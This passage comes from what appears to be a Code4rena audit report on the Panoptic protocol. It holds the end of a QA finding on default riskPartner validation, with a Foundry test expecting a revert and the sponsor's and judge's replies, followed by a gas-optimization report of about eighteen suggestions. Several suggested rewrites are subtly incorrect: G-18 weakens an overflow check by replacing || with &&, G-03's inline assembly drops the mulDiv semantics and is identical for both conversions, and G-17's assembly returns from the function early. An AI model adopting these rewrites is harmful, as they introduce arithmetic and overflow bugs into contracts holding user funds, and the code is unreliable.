    function addRiskPartner(
       ...
```

On top of that, the [technical specification](https://panoptic.xyz/docs/developers/tokenid) regarding the `TokenId` library in the protocol's documentation is also not complete. The most comprehensive explanation about the risk partner is the [developer comments](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/types/TokenId.sol#L129C5-L139C91) I mentioned in the beginning of this submission, which clearly shows the default risk partner is 0.  

Users can not know they should've created the `tokenId`s with the "leg index" instead of the default value. They will construct `tokenId`s based on the developer comment above, and these multi-legged tokens will not be validated.

### Coded PoC

You can use protocol's own test suite to test this issue.
- Copy and paste the snippet in the `SemiFungiblePositionManager.t.sol` test file.
- Run it with `forge test --match-test test_Revert_MultiLegged_TokenId_With_DefaultRiskPartner -vvv`:

```solidity
function test_Revert_MultiLegged_TokenId_With_DefaultRiskPartner() public {
        _initPool(1);

        uint256 tokenId = uint256(0).addUniv3pool(poolId).addLeg(
            0, //leg index
            1, // option ratio
            0, // asset
            0, // isLong
            0, // tokenType
            0, // riskPartner
            1000, // strike
            10 // width
        );

        // add second leg with riskPartner default 0 (No risk partner);
        tokenId = tokenId.addLeg(
            1, // leg index 
            1, // option ratio
            0, // asset
            0, // isLong
            0, // tokenType
            0, // riskPartner -> It is default 0 (No risk partner)
            1000, // strike
            10 // width
        );

        // Try to mint this token Id.
        // It will revert with InvalidTokenIdParameter(3) error
        vm.expectRevert(abi.encodeWithSelector(Errors.InvalidTokenIdParameter.selector, 3));
        sfpm.mintTokenizedPosition(
            tokenId,
            1e18,
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );
    }
```  

The results after running the test:

```solidity
Running 1 test for test/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest
[PASS] test_Revert_MultiLegged_TokenId_With_DefaultRiskPartner() (gas: 1359556)
Logs:
  Bound Result 1

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.29s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation Steps

I would recommend rebuilding the validate function based on the default risk partner value, or updating the documentation and developer comments since this is a library contract and inconsistent explanations will result in incorrect usage of the library.

### Assessed type

Invalid Validation

**[dyedm1 (Panoptic) disputed and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/285#issuecomment-1859301835):**
> I agree the comment could be confusing, but it basically says that the `riskPartner` being equal to 0 can either mean it is partnered with 0 or that there is no risk partner; which is technically correct, since for leg idx 0 it means no risk partner and for any other leg it means it's partnered with 0. In general, you set the rp of a leg to its own index to specify no partner, and otherwise set it to the index of the leg you want to partner with.

**[Picodes (judge) commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/285#issuecomment-1866298099):**
> Indeed the code is correct under the assumption that no risk partner means `riskPartner == i`. I'll downgrade to QA as it shows that the comments are unclear though.

***

# Gas Optimizations

For this audit, 18 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-11-panoptic-findings/issues/504) by **sivanesh_808** received the top score from the judge.

*The following wardens also submitted reports: [0xAnah](https://github.com/code-423n4/2023-11-panoptic-findings/issues/580), [JCK](https://github.com/code-423n4/2023-11-panoptic-findings/issues/515), [Sathish9098](https://github.com/code-423n4/2023-11-panoptic-findings/issues/56), [SY\_S](https://github.com/code-423n4/2023-11-panoptic-findings/issues/612), [0xhex](https://github.com/code-423n4/2023-11-panoptic-findings/issues/597), [alix40](https://github.com/code-423n4/2023-11-panoptic-findings/issues/595), [0xta](https://github.com/code-423n4/2023-11-panoptic-findings/issues/588), [fnanni](https://github.com/code-423n4/2023-11-panoptic-findings/issues/564), [unique](https://github.com/code-423n4/2023-11-panoptic-findings/issues/512), [naman1778](https://github.com/code-423n4/2023-11-panoptic-findings/issues/278), [SAQ](https://github.com/code-423n4/2023-11-panoptic-findings/issues/265), [0x886699](https://github.com/code-423n4/2023-11-panoptic-findings/issues/217), [arjun16](https://github.com/code-423n4/2023-11-panoptic-findings/issues/155), [K42](https://github.com/code-423n4/2023-11-panoptic-findings/issues/111), [Eurovickk](https://github.com/code-423n4/2023-11-panoptic-findings/issues/110), [0x6980](https://github.com/code-423n4/2023-11-panoptic-findings/issues/91), and [nisedo](https://github.com/code-423n4/2023-11-panoptic-findings/issues/32).*

| ID | Title        |
|------|------------------------|
| [G-01] | Efficient Gas Usage in `LiquidityChunk` Library Through Optimization |
| [G-02] | Optimization of AMM Swap Fees Calculation in Solidity |
| [G-03] | Refactoring Math Library Calls to Inline Assembly |
| [G-04] | Efficient Absolute Value Calculation |
| [G-05] | Simplification of Tick Check in `getSqrtRatioAtTick` |
| [G-06] | Reduction in Type Casting Operations |
| [G-07] | Improved Efficiency in `mulDiv` Function |
| [G-08] | Streamlining `toUint128` Casting |
| [G-09] | Loop Optimization in `getSqrtRatioAtTick` |
| [G-10] | Refactoring Redundant Code in Liquidity Functions |
| [G-11] | Reducing Redundant Computation in `mulDiv` Function |
| [G-12] | Simplifying `getSqrtRatioAtTick` Calculation |
| [G-13] | Efficient Data Storage in `getLiquidityForAmount1` |
| [G-14] | Assembly Optimization in `mulDiv` Function |
| [G-15] | Enhanced Gas Efficiency in Solidity via Integer Operation Refactoring |
| [G-16] | Optimization of Gas Usage in Solidity Smart Contracts Through Efficient Bit Packing |
| [G-17] | Optimizing Gas Usage in Solidity Through Inline Assembly for Direct Memory Access |
| [G-18] | Optimization of Solidity Code for Gas Efficiency Using Combined Arithmetic Operations |
| [G-19] | Avoid Unnecessary State Updates |
| [G-20] | Use Short-Circuit Logic in Conditional Checks |
| [G-21] | Gas-Efficient Loops |
| [G-22] | Minimize Redundant Computations in Functions |
| [G-23] | Inefficient Loop Iterations in `_createPositionInAMM` |

## [G-01] Efficient Gas Usage in `LiquidityChunk` Library Through Optimization

[LiquidityChunk.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LiquidityChunk.sol#L63)

The `LiquidityChunk` library, integral to managing liquidity in a concentrated liquidity AMM system, originally utilized a series of functions to manipulate and encode data into a 256-bit structure. This report details an optimization approach that significantly reduces gas consumption. The primary method of optimization was the consolidation of multiple function calls into a single operation, leveraging direct bitwise manipulation. This approach reduces the overhead associated with multiple function calls and streamlines the encoding process.

<details>

### Original Code

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

library LiquidityChunkOriginal {
    function createChunk(
        uint256 self,
        int24 _tickLower,
        int24 _tickUpper,
        uint128 amount
    ) internal pure returns (uint256) {
        unchecked {
            return addLiquidity(self, amount) + addTickLower(self, _tickLower) + addTickUpper(self, _tickUpper);
        }
    }

    function addLiquidity(uint256 self, uint128 amount) internal pure returns (uint256) {
        unchecked {
            return self + uint256(amount);
        }
    }

    function addTickLower(uint256 self, int24 _tickLower) internal pure returns (uint256) {
        unchecked {
            return self + (uint256(uint24(_tickLower)) << 232);
        }
    }

    function addTickUpper(uint256 self, int24 _tickUpper) internal pure returns (uint256) {
        unchecked {
            return self + ((uint256(uint24(_tickUpper))) << 208);
        }
    }
}
```

### Optimized Code

```solidity
library LiquidityChunkOptimized {
    function createChunk(
        uint256 self,
        int24 _tickLower,
        int24 _tickUpper,
        uint128 amount
    ) internal pure returns (uint256) {
        return uint256(uint24(_tickLower)) << 232 | uint256(uint24(_tickUpper)) << 208 | uint256(amount);
    }
}
```

### Optimization Analysis:
1. **Direct Bit Manipulation in `createChunk`:** The optimized `createChunk` function combines the addition of liquidity, lower tick, and upper tick into a single operation using bitwise manipulation. This direct approach removes the need for multiple function calls, thus reducing gas consumption.

2. **Removal of Redundant Functions:** In the optimized version, the functions `addLiquidity`, `addTickLower`, and `addTickUpper` are rendered unnecessary due to their functionalities being absorbed into the `createChunk` function. This not only simplifies the code but also eliminates the gas costs associated with additional function calls and stack manipulation.

3. **Efficient Use of Solidity's Capabilities:** The optimization takes advantage of Solidity's efficient handling of bitwise operations, which is inherently less gas-intensive than sequential function calls.

</details>

## [G-02] Optimization of AMM Swap Fees Calculation in Solidity

[FeesCalc.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/FeesCalc.sol#L54)

The `FeesCalc` library, designed for calculating AMM swap fees in a Uniswap-like environment, originally contained a function `calculateAMMSwapFeesLiquidityChunkOriginal`. This function computed fees based on liquidity chunks, making multiple external calls to a Uniswap V3 pool mock contract and performing arithmetic operations to determine fee growth inside a liquidity range. An optimization was proposed to enhance gas efficiency by minimizing external contract calls and optimizing computation.

<details>

### Original Code

```solidity
function calculateAMMSwapFeesLiquidityChunkOriginal(
    MockUniswapV3Pool univ3pool,
    int24 currentTick,
    int24 tickLower,
    int24 tickUpper,
    uint128 startingLiquidity
) public view returns (int256 feesEachToken) {
    (, , uint256 lowerOut0, uint256 lowerOut1, , , , ) = univ3pool.ticks(tickLower);
    (, , uint256 upperOut0, uint256 upperOut1, , , , ) = univ3pool.ticks(tickUpper);

    unchecked {
        uint256 feeGrowthInside0X128;
        uint256 feeGrowthInside1X128;
        
        // ... original logic ...
        
        uint256 totalFeeGrowth = feeGrowthInside0X128 + feeGrowthInside1X128;
        feesEachToken = int256(uint256(startingLiquidity)) * int256(totalFeeGrowth);
    }
}
```

### Optimized Code

```solidity
function calculateAMMSwapFeesLiquidityChunkOptimized(
    MockUniswapV3Pool univ3pool,
    int24 currentTick,
    int24 tickLower,
    int24 tickUpper,
    uint128 startingLiquidity
) public view returns (int256 feesEachToken) {
    (uint256 lowerOut0, uint256 lowerOut1, uint256 upperOut0, uint256 upperOut1) = getTickData(univ3pool, tickLower, tickUpper);

    uint256 feeGrowthInside0X128;
    uint256 feeGrowthInside1X128;
    
    // Optimized computation logic here...

    uint256 totalFeeGrowth = feeGrowthInside0X128 + feeGrowthInside1X128;
    feesEachToken = int256(uint256(startingLiquidity)) * int256(totalFeeGrowth);
}

function getTickData(MockUniswapV3Pool univ3pool, int24 tickLower, int24 tickUpper) internal view returns (uint256 lowerOut0, uint256 lowerOut1, uint256 upperOut0, uint256 upperOut1) {
    (, , lowerOut0, lowerOut1, , , , ) = univ3pool.ticks(tickLower);
    (, , upperOut0, upperOut1, , , , ) = univ3pool.ticks(tickUpper);
}
```

The optimized version of the function introduces a helper function `getTickData` to consolidate the external calls to `univ3pool.ticks`. By fetching both the lower and upper tick data in a single location, the optimized version reduces the overhead and potential complexity associated with multiple external calls. Additionally, it sets the stage for further optimization in the computation logic, which can be tailored based on the specific requirements of the contract and the underlying AMM mechanism.

</details>

## [G-03]  Refactoring Math Library Calls to Inline Assembly

[PanopticMath.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/PanopticMath.sol#L145)

The current implementation uses external calls to a `Math` library for arithmetic operations, which incurs additional gas due to external function call overhead. By using inline assembly for these arithmetic operations, we can optimize gas usage. This is especially effective in the `convert0to1` and `convert1to0` functions, where multiple calls to the `Math` library are made. Inline assembly allows for more control over the Ethereum Virtual Machine (EVM) and can reduce gas costs, although it requires careful implementation to ensure security and correctness.

<details>

### Original Code

```solidity
function convert0to1(int256 amount, uint160 sqrtPriceX96) internal pure returns (int256) {
    // ... existing code ...
    int256 absResult = Math
        .mulDiv192(Math.absUint(amount), uint256(sqrtPriceX96) ** 2)
        .toInt256();
    // ... existing code ...
}

function convert1to0(int256 amount, uint160 sqrtPriceX96) internal pure returns (int256) {
    // ... existing code ...
    int256 absResult = Math
        .mulDiv(Math.absUint(amount), 2 ** 192, uint256(sqrtPriceX96) ** 2)
        .toInt256();
    // ... existing code ...
}
```

### Optimized Code

```solidity
function convert0to1(int256 amount, uint160 sqrtPriceX96) internal pure returns (int256) {
    // ... existing code ...
    int256 absResult;
    assembly {
        let m := mload(0x40) // Load free memory pointer
        mstore(m, amount)    // Store amount at memory location m
        mstore(add(m, 0x20), sqrtPriceX96) // Store sqrtPriceX96 next to amount

        // Perform the multiplication and division inline
        absResult := div(mul(mload(m), mload(add(m, 0x20))), 0x100000000000000000000000000000000)
    }
    // ... existing code ...
}

function convert1to0(int256 amount, uint160 sqrtPriceX96) internal pure returns (int256) {
    // ... existing code ...
    int256 absResult;
    assembly {
        let m := mload(0x40) // Load free memory pointer
        mstore(m, amount)    // Store amount at memory location m
        mstore(add(m, 0x20), sqrtPriceX96) // Store sqrtPriceX96 next to amount

        // Perform the multiplication and division inline
        absResult := div(mul(mload(m), mload(add(m, 0x20))), 0x100000000000000000000000000000000)
    }
    // ... existing code ...
}
```

This optimization introduces inline assembly to replace external library calls, aiming to minimize gas consumption. However, it's crucial to note that using inline assembly requires a deep understanding of the EVM and can introduce risks if not correctly implemented. It's highly recommended to conduct extensive testing and possibly a security audit when making such changes to ensure the contract's security and functionality are not compromised.

</details>

## [G-04] Efficient Absolute Value Calculation

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L23)

The original `absUint` function uses an unchecked block and a ternary operator for computing the absolute value. This can be streamlined for better efficiency.

<details>

### Original Code

```solidity
function absUint(int256 x) internal pure returns (uint256) {
    unchecked {
        return x > 0 ? uint256(x) : uint256(-x);
    }
}
```

### Optimized Code

```solidity
function absUint(int256 x) internal pure returns (uint256) {
    return uint256(x < 0 ? -x : x);
}
```

The optimized code removes the unchecked block and simplifies the ternary operation. This should reduce gas usage due to the more straightforward logic.

</details>

## [G-05] Simplification of Tick Check in `getSqrtRatioAtTick`

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L41)

The tick check in `getSqrtRatioAtTick` uses an `if` statement with a `revert`. This can be replaced with a `require` for clarity and potential gas savings.

<details>

### Original Code

```solidity
if (absTick > uint256(int256(Constants.MAX_V3POOL_TICK))) revert Errors.InvalidTick();
```

### Optimized Code

```solidity
require(absTick <= uint256(int256(Constants.MAX_V3POOL_TICK)), "Errors.InvalidTick");
```

</details>

Using `require` instead of an `if` statement with `revert` makes the intent clearer and can be more gas-efficient, as `require` is optimized for condition checking.

## [G-06] Reduction in Type Casting Operations

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L89)

In the calculation of `sqrtPriceX96`, multiple casting operations are performed which can be optimized.

<details>

### Original Code

```solidity
sqrtPriceX96 = uint160((sqrtR >> 32) + (sqrtR % (1 << 32) == 0 ? 0 : 1));
```

### Optimized Code

```solidity
sqrtPriceX96 = uint160(sqrtR >> 32) + (sqrtR % (1 << 32) == 0 ? 0 : 1);
```

</details>

Performing the bit shift before casting reduces the need for multiple casting operations, potentially saving gas.

## [G-07] Improved Efficiency in `mulDiv` Function

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L207)

The `mulDiv` function uses a `require` statement with a less efficient comparison for uint types.

<details>

### Original Code

```solidity
require(denominator > 0);
```

### Optimized Code

```solidity
require(denominator != 0, "Denominator cannot be zero");
```

</details>

Using `!= 0` is more efficient than `> 0` for uint types in `require` statements. Also, adding an error message provides better clarity.

## [G-08] Streamlining `toUint128` Casting

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L173)

The `toUint128` function can be simplified to make the casting process more efficient and clear.

<details>

### Original Code

```solidity
if ((downcastedInt = uint128(toDowncast)) != toDowncast) revert Errors.CastingError();
```

### Optimized Code

```solidity
downcastedInt = uint128(toDowncast);
require(downcastedInt == toDowncast, "Errors.CastingError");
```

</details>

Separating the assignment and the condition check improves readability and can potentially optimize gas usage due to simpler operations.

## [G-09] Loop Optimization in `getSqrtRatioAtTick`

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L38)

The original code in `getSqrtRatioAtTick` contains repetitive `if` statements for each bit position. This can be optimized using a loop.

<details>

### Original Code

Multiple `if` statements in `getSqrtRatioAtTick` function, such as:
```solidity
if (absTick & 0x1 != 0) sqrtR = (sqrtR * 0xfffcb933bd6fad37aa2d162d1a594001) >> 128;
if (absTick & 0x2 != 0) sqrtR = (sqrtR * 0xfff97272373d413259a46990580e213a) >> 128;
// ... and so on for each bit position
```

### Optimized Code

```solidity
uint256[19] memory constants = [0xfffcb933bd6fad37aa2d162d1a594001, 0xfff97272373d413259a46990580e213a, /* ... other constants ... */];
for (uint256 i = 0; i < 19; i++) {
    if (absTick & (1 << i) != 0) {
        sqrtR = (sqrtR * constants[i]) >> 128;
    }
}
```

</details>

Using a loop with an array of constants can reduce the bytecode size and potentially improve gas efficiency, especially if this function is called frequently.

## [G-10] Refactoring Redundant Code in Liquidity Functions

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L119)

The `getAmount1ForLiquidity` and `getLiquidityForAmount1` functions have redundant calls to `getSqrtRatioAtTick`.

<details>

### Original Code

```solidity
function getAmount1ForLiquidity(uint256 liquidityChunk) internal pure returns (uint256 amount1) {
    uint160 lowPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickLower());
    uint160 highPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickUpper());
    // ...
}

function getLiquidityForAmount1(uint256 liquidityChunk, uint256 amount1) internal pure returns (uint128 liquidity) {
    uint160 lowPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickLower());
    uint160 highPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickUpper());
    // ...
}
```

### Optimized Code

```solidity
function calculatePriceX96(uint256 liquidityChunk) internal pure returns (uint160 lowPriceX96, uint160 highPriceX96) {
    lowPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickLower());
    highPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickUpper());
}

// Refactor the original functions to use calculatePriceX96
```

</details>

Refactoring the repeated logic into a separate function `calculatePriceX96` improves code reusability and readability, potentially reducing gas costs due to decreased code duplication.

## [G-11] Reducing Redundant Computation in `mulDiv` Function

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L251)

The `mulDiv` function contains repeated computations which can be optimized.

<details>

### Original Code

```solidity
assembly {
    twos := add(div(sub(0, twos), twos), 1)
}
prod0 |= prod1 * twos;
```

### Optimized Code

```solidity
uint256 twosComplement;
assembly {
    twosComplement := add(div(sub(0, twos), twos), 1)
}
prod0 |= prod1 * twosComplement;
```

</details>

Storing the result of the computation in a separate variable and then using it, instead of recalculating, can save gas.

## [G-12] Simplifying `getSqrtRatioAtTick` Calculation

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L23)

The `getSqrtRatioAtTick` function performs repetitive conditional checks that can be optimized.

<details>

### Original Code

```solidity
if (absTick & 0x1 != 0) sqrtR = (sqrtR * CONSTANT1) >> 128;
if (absTick & 0x2 != 0) sqrtR = (sqrtR * CONSTANT2) >> 128;
// Repeats for other constants
```

### Optimized Code

```solidity
uint256[] memory sqrtConstants = [CONSTANT1, CONSTANT2, /* other constants */];
for (uint256 i = 0; i < sqrtConstants.length; i++) {
    if (absTick & (1 << i) != 0) {
        sqrtR = (sqrtR * sqrtConstants[i]) >> 128;
    }
}
```

</details>

Storing constants in an array and using a loop to iterate through them reduces repetitive code and can improve gas efficiency.

## [G-13] Efficient Data Storage in `getLiquidityForAmount1`

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L154)

Optimize the storage of data in the `getLiquidityForAmount1` function by reducing the number of times data is stored in state variables.

<details>

### Original Code

```solidity
function getLiquidityForAmount1(uint256 liquidityChunk, uint256 amount1) internal pure returns (uint128 liquidity) {
    uint160 lowPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickLower());
    uint160 highPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickUpper());
    // ... computation using lowPriceX96 and highPriceX96
}
```

### Optimized Code

```solidity
function getLiquidityForAmount1(uint256 liquidityChunk, uint256 amount1) internal pure returns (uint128 liquidity) {
    (uint160 lowPriceX96, uint160 highPriceX96) = getSqrtPriceX96(liquidityChunk);
    // ... computation using lowPriceX96 and highPriceX96
}

function getSqrtPriceX96(uint256 liquidityChunk) internal pure returns (uint160 lowPriceX96, uint160 highPriceX96) {
    lowPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickLower());
    highPriceX96 = getSqrtRatioAtTick(liquidityChunk.tickUpper());
}
```

</details>

Refactoring the price calculation into a separate function and returning both values in a single call reduces redundancy and improves gas efficiency.

## [G-14] Assembly Optimization in `mulDiv` Function

[Math.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/libraries/Math.sol#L197)

The `mulDiv` function can be optimized by using inline assembly for certain arithmetic operations.

<details>

### Original Code

```solidity
uint256 prod0; // Least significant 256 bits of the product
uint256 prod1; // Most significant 256 bits of the product
// ... calculations involving prod0 and prod1
```

### Optimized Code

```solidity
assembly {
    // Inline assembly code for optimized prod0 and prod1 calculations
    // Example: 
    // let mm := mulmod(a, b, not(0))
    // prod0 := mul(a, b)
    // prod1 := sub(sub(mm, prod0), lt(mm, prod0))
}
```

</details>

Using inline assembly for certain complex arithmetic operations can be more efficient than high-level Solidity code. However, this approach should be used cautiously due to potential readability and security concerns.

## [G-15] Enhanced Gas Efficiency in Solidity via Integer Operation Refactoring

[LeftRight.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LeftRight.sol#L177)

The Solidity code provided for review demonstrates a conventional approach to handling 256-bit integers, particularly in operations involving their division into 128-bit halves. This review identifies a specific optimization opportunity within the subtraction function. The suggested enhancement focuses on streamlining arithmetic operations and utilizing bitwise manipulations. These modifications are designed to reduce the computational complexity and, consequently, the gas consumption of these operations—a critical factor in Ethereum-based smart contract execution.

<details>

### Original Code

```solidity
/// @notice Subtract two int256 bit LeftRight-encoded words; revert on overflow.
/// @param x the minuend
/// @param y the subtrahend
/// @return z the difference x - y
function sub(int256 x, int256 y) internal pure returns (int256 z) {
    unchecked {
        int256 left256 = int256(x.leftSlot()) - y.leftSlot();
        int128 left128 = int128(left256);

        int256 right256 = int256(x.rightSlot()) - y.rightSlot();
        int128 right128 = int128(right256);

        if (left128 != left256 || right128 != right256) revert Errors.UnderOverFlow();

        return z.toRightSlot(right128).toLeftSlot(left128);
    }
}
```

### Optimized Code

```solidity
/// @notice Enhanced subtraction of two int256 bit LeftRight-encoded words; revert on overflow.
/// @param x the minuend
/// @param y the subtrahend
/// @return z the difference x - y, optimized for gas efficiency
function optimizedSub(int256 x, int256 y) internal pure returns (int256 z) {
    unchecked {
        // Simultaneously perform subtraction and type casting to reduce operations
        int128 left128 = int128(int256(x.leftSlot()) - y.leftSlot());
        int128 right128 = int128(int256(x.rightSlot()) - y.rightSlot());

        // Utilize arithmetic shift for overflow/underflow checks instead of direct comparison
        // This is generally more gas-efficient in the EVM
        if ((left128 >> 127 != (x.leftSlot() - y.leftSlot()) >> 127) ||
            (right128 >> 127 != (x.rightSlot() - y.rightSlot()) >> 127)) {
            revert Errors.UnderOverFlow();
        }

        // Employ bitwise operations for final combination of left and right slots
        // Bitwise operations are typically less gas-intensive than arithmetic operations in EVM
        z = int256(right128) | (int256(left128) << 128);
    }
}
```

### Technical Explanation of Optimization

1. **Integrated Subtraction and Casting**: The original code performs subtraction and casting to 128-bit integers in separate steps. The optimized code combines these operations, reducing the total number of operations and thereby potentially minimizing gas usage.
   
2. **Arithmetic Shift for Overflow Detection**: Traditional overflow checks compare the results of 128-bit and 256-bit operations directly. The optimized approach uses an arithmetic shift to examine the sign bit of the results, which is a more efficient method in the EVM context for detecting overflows and underflows.

3. **Bitwise Operations for Combining Results**: The final step of combining the left and right slots is accomplished using bitwise OR and shift operations. These operations are generally more gas-efficient in EVM than their arithmetic counterparts, leading to further optimization.

</details>

## [G-16] Optimization of Gas Usage in Solidity Smart Contracts Through Efficient Bit Packing

[LeftRight.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LeftRight.sol#L108)

The provided Solidity code employs a sophisticated approach for manipulating 256-bit integers by splitting them into 128-bit halves. An area of potential optimization lies in the methods used to pack and unpack these integers. The proposed optimization focuses on enhancing the efficiency of these operations using more gas-efficient techniques in Solidity, which is crucial for minimizing transaction costs on the Ethereum network.

<details>

### Original Code

```solidity
/// @notice Write the "left" slot to a uint256 bit pattern.
/// @param self the original full uint256 bit pattern to be written to
/// @param left the bit pattern to write into the full pattern in the right half
/// @return self with left added to its left 128 bits
function toLeftSlot(uint256 self, uint128 left) internal pure returns (uint256) {
    unchecked {
        return self + (uint256(left) << 128);
    }
}
```

### Optimized Code

```solidity
/// @notice Optimized method to write the "left" slot to a uint256 bit pattern.
/// @param self the original full uint256 bit pattern to be written to
/// @param left the bit pattern to write into the full pattern in the left half
/// @return self with left efficiently packed into its left 128 bits
function optimizedToLeftSlot(uint256 self, uint128 left) internal pure returns (uint256) {
    unchecked {
        // Clear the left 128 bits of 'self' before packing to ensure clean insertion of 'left'
        uint256 clearedSelf = self & uint256(type(uint128).max);
        // Efficiently pack 'left' into the cleared left 128 bits of 'self'
        return clearedSelf | (uint256(left) << 128);
    }
}
```

### Technical Explanation of Optimization

1. **Clearing Before Packing**: The original code adds the left 128 bits directly to the `self` variable, which might lead to incorrect data if `self` already has data in its left 128 bits. The optimized code first clears the left 128 bits of `self` by using a bitwise AND operation with the maximum value of a 128-bit unsigned integer. This ensures that the left 128 bits are set to zero before the new data is packed.

2. **Efficient Bitwise Packing**: After clearing the left half of `self`, the optimized code uses a bitwise OR operation to combine `self` with the shifted `left` value. This method is more efficient in terms of gas usage as it reduces the risk of overwriting existing data and ensures a clean packing of the new data into the left 128 bits.

3. **Avoiding Potential Data Corruption**: By ensuring that the left 128 bits of `self` are clear before inserting the new `left` data, the optimized code avoids potential data corruption that can occur if `self` already contains some data in its left half. This is a crucial aspect in smart contract coding where data integrity is paramount.

</details>

## [G-17] Optimizing Gas Usage in Solidity Through Inline Assembly for Direct Memory Access

[LeftRight.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LeftRight.sol#L75)

In the provided Solidity code, which involves handling and manipulation of 256-bit integers, there is potential for optimization by utilizing inline assembly for direct memory access. This approach can significantly reduce gas costs by bypassing some of the higher-level abstractions of Solidity and directly interacting with the Ethereum Virtual Machine (EVM) memory. The focus of this optimization is on the functions that manipulate large integers, where direct memory operations can be more efficient.

<details>

### Original Code

```solidity
/// @notice Write the "right" slot to an int256.
/// @param self the original full int256 bit pattern to be written to
/// @param right the bit pattern to write into the full pattern in the right half
/// @return self with right added to its right 128 bits
function toRightSlot(int256 self, int128 right) internal pure returns (int256) {
    unchecked {
        return self + (int256(right) & RIGHT_HALF_BIT_MASK);
    }
}
```

### Optimized Code Using Inline Assembly

```solidity
/// @notice Optimized writing of the "right" slot to an int256 using inline assembly.
/// @param self the original full int256 bit pattern to be written to
/// @param right the bit pattern to write into the full pattern in the right half
/// @return self with right added to its right 128 bits, using direct memory manipulation
function optimizedToRightSlot(int256 self, int128 right) internal pure returns (int256) {
    assembly {
        // Load the value of 'self' into a temporary variable
        let tmp := self

        // Clear the right 128 bits of 'tmp'
        tmp := and(tmp, not(RIGHT_HALF_BIT_MASK))

        // Add the 'right' value to the right 128 bits of 'tmp'
        tmp := or(tmp, and(right, RIGHT_HALF_BIT_MASK))

        // Return the modified value
        mstore(0x40, tmp)
        return(0x40, 0x20)
    }
}
```

### Technical Explanation of Optimization

1. **Direct Memory Manipulation**: Inline assembly allows direct manipulation of memory, which can be more gas-efficient than higher-level Solidity operations. The optimized code directly accesses and modifies the memory representing the integer variables.

2. **Efficient Bitwise Operations**: The assembly code uses bitwise operations (`and`, `not`, `or`) to clear and set the right 128 bits of the integer. This approach can be more efficient than arithmetic operations, especially in the EVM where certain operations have fixed gas costs.

3. **Reduced High-Level Overhead**: By using inline assembly, the code bypasses some of the overhead associated with Solidity's high-level abstractions. This can lead to significant gas savings, especially in complex operations involving large integers.

4. **Caution and Expertise Required**: Inline assembly should be used with caution as it bypasses many safety checks and abstractions provided by Solidity. It requires a deep understanding of the EVM and should be used only when necessary and by experienced developers.

</details>

## [G-18] Optimization of Solidity Code for Gas Efficiency Using Combined Arithmetic Operations

[LeftRight.sol](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LeftRight.sol#L151)
 
In the provided Solidity code, an optimization opportunity arises in the arithmetic operations, specifically in the functions handling the addition and subtraction of `LeftRight` encoded words. By combining arithmetic operations and reducing intermediate steps, gas usage can be optimized. This is especially effective in the Ethereum Virtual Machine (EVM) where each operation consumes a certain amount of gas.

<details>

### Original Code

```solidity
/// @notice Add two uint256 bit LeftRight-encoded words; revert on overflow or underflow.
/// @param x the augend
/// @param y the addend
/// @return z the sum x + y
function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
    unchecked {
        z = x + y;
        if (z < x || (uint128(z) < uint128(x))) revert Errors.UnderOverFlow();
    }
}
```

### Optimized Code

```solidity
/// @notice Optimized addition of two uint256 bit LeftRight-encoded words; revert on overflow or underflow.
/// @param x the augend
/// @param y the addend
/// @return z the sum x + y, optimized for gas efficiency
function optimizedAdd(uint256 x, uint256 y) internal pure returns (uint256 z) {
    unchecked {
        z = x + y;
        // Combine the overflow checks into a single statement to reduce gas usage
        if ((z < x) && (uint128(z) < uint128(x))) revert Errors.UnderOverFlow();
    }
}
```

### Technical Explanation of Optimization

1. **Combined Overflow Checks**: In the original code, there are two separate overflow checks after the addition operation. The optimized code combines these checks into a single conditional statement. This reduces the number of conditional checks and potentially lowers the gas consumption.

2. **Efficient Boolean Logic**: The use of logical AND (`&&`) operator ensures that both conditions must be evaluated together. If the first condition fails, the second condition won't be evaluated, further optimizing the execution.

3. **Reduced Computational Overhead**: By minimizing the number of separate conditional checks, the code reduces the computational overhead associated with each check. This is particularly beneficial in a blockchain environment where computational resources equate directly to operational costs.

